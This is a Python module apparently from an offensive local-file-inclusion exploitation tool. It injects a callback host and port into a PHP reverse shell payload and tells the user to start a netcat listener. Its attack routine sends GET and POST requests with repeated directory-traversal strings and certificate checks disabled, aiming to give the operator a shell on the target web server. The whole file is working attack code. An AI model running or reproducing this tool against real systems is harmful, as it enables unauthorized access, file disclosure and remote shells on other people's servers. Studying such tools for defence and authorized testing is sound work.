import sys
from os.path import dirname, abspath, join
from shutil import copy2
import requests
from urllib3.exceptions import InsecureRequestWarning

PATH_TRAVERSAL = ["../", "..\\", "/../", "./../"]
HERE = dirname(abspath(__file__))

SHELL = join(HERE, "shell.php")

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


class listener:
    """Generate payload that could be used by Metasploit"""

    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport

    def handler(self):
        print(colors("[~] Start your listener by running", 93), end="")
        print(colors(" nc -ntlp {}".format(self.lport), 91))


def msf_payload():
    """Use msfvenom to generate reverse shell payload"""
    filepath = "/tmp/shell.php"
    lhost = input(colors("[?] Host For Callbacks: ", 94))
    lport = input(colors("[?] Port For Callbacks: ", 94))

    print(colors("[~] Generating PHP listener", 93))

    copy2(SHELL, filepath)

    with open(filepath, "r") as f:
        payload = f.read()

    payload = payload.replace("127.0.0.1", lhost)
    payload = payload.replace("4444", lport)

    with open(filepath, "w") as f:
        f.write(payload)

    print(colors("[+] Success! ", 92))
    print(colors("[~] listener: /tmp/shell.php", 93))

    return lhost, lport, "shell"


def colors(string, color):
    """Make things colorfull

    Arguments:
        string {str} -- String to apply colors on
        color {int} -- value of color to apply

    """
    return "\033[%sm%s\033[0m" % (color, string)


def cook(cookies):
    c = dict(item.split("=") for item in cookies.split(";"))
    return c


def parse_headers(header_string):
    """Parse custom headers from command line format"""
    if not header_string:
        return {}

    headers = {}
    for header in header_string.split(","):
        if ":" in header:
            key, value = header.split(":", 1)
            headers[key.strip()] = value.strip()
    return headers


def parse_post_data(data_string):
    """Parse POST data from command line format"""
    if not data_string:
        return {}

    data = {}
    for param in data_string.split("&"):
        if "=" in param:
            key, value = param.split("=", 1)
            data[key] = value
    return data


def attack(
    target,
    location,
    cookies=None,
    headers=None,
    payload=None,
    traverse=False,
    relative=False,
    data=None,
    dt=False,
    detection_mode=False,
    method="GET",
    post_data=None,
    custom_headers=None,
):
    """Perform specified type of LFI attack

    Arguments:
        target {str} -- Target URL
        location {str} -- Specific location to test

    Keyword Arguments:
        cookies {str} -- Authenticate with cookies (default: {None})
        headers {str} -- Specify headers (default: {None})
        payload {str} -- Custom payload (default: {None})
        traverse {bool} -- traverse the URL (default: {False})
        relative {bool} -- check for relative URL (default: {False})
        dt {bool}  --  Test for directory traversal (default: {False})
    """

    url = target + location

    # Merge custom headers with default headers
    request_headers = headers or {}
    if custom_headers:
        request_headers.update(custom_headers)

    # Add User-Agent if not specified
    if "User-Agent" not in request_headers:
        request_headers["User-Agent"] = (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        )

    try:
        if dt:
            if method.upper() == "POST":
                res = requests.post(
                    url, headers=request_headers, data=post_data, verify=False
                )
            else:
                res = requests.get(url, headers=request_headers, verify=False)
            if res.status_code == 200:
                print(colors("[+] Vulnerable: " + url, 92))

        # Main request
        if method.upper() == "POST":
            if post_data:
                response = requests.post(
                    url,
                    headers=request_headers,
                    cookies=cookies,
                    data=post_data,
                    verify=False,
                )
            else:
                # For POST requests without explicit data, put the location in POST body
                post_body = {"file": location} if not post_data else post_data
                response = requests.post(
                    url.split("?")[0],
                    headers=request_headers,
                    cookies=cookies,
                    data=post_body,
                    verify=False,
                )
        else:
            response = requests.get(
                url, headers=request_headers, cookies=cookies, verify=False
            )

        if response.status_code != 200:
            print(colors("[!] Unexpected HTTP Response ", 91))
            sys.exit(1)
        if not relative:
            if method.upper() == "POST":
                if post_data:
                    r = requests.post(
                        url, headers=request_headers, data=post_data, verify=False
                    )
                else:
                    post_body = {"file": location}
                    r = requests.post(
                        url.split("?")[0],
                        headers=request_headers,
                        data=post_body,
                        verify=False,
                    )
            else:
                r = requests.get(url, headers=request_headers, verify=False)

            if r.status_code != 200:
                if not detection_mode:
                    print(colors("[!] Unexpected HTTP Response ", 91))
            else:
                if not detection_mode:
                    print(
                        colors(
                            "[!] Try Refreshing Your Browser If You Haven't Gotten A Shell ",
                            91,
                        )
                    )

        else:
            for traversal in PATH_TRAVERSAL:
                for i in range(10):
                    lfi = target + traversal * i + location
                    if method.upper() == "POST":
                        if post_data:
                            r = requests.post(
                                lfi,
                                headers=request_headers,
                                cookies=cookies,
                                data=post_data,
                                verify=False,
                            )
                        else:
                            post_body = {"file": traversal * i + location}
                            r = requests.post(
                                target,
                                headers=request_headers,
                                cookies=cookies,
                                data=post_body,
                                verify=False,
                            )
                    else:
                        r = requests.get(
                            lfi, headers=request_headers, cookies=cookies, verify=False
                        )

                    if r.status_code != 200:
                        print(colors("[!] Unexpected HTTP Response ", 91))
            if not detection_mode:
                print(
                    colors(
                        "[!] Try Refreshing Your Browser If You Haven't Gotten A Shell ",
                        91,
                    )
                )

        return response

    except Exception as e:
        print(colors("[!] HTTP Error", 91))
        print(e)
        sys.exit(1)
